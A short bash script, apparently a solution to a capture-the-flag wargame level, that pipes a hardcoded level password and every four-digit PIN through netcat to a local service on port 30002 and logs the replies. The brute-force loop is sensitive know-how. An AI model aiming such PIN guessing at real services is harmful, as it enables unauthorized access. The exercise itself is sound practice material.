#!/bin/bash

#nc localhost 30002
#commenting out netcat to test bruteforce output
#echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {0..9}{0..9}{0..9}{0..9}
#commenting out first try
passwordlevel24="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for a in {0..9}
do
    for b in {0..9}
    do
        for c in {0..9}
        do
            for d in {0..9}
            do
                echo $passwordlevel24' '$a$b$c$d | nc localhost 30002 >> lvl25 
           done
        done
    done
done
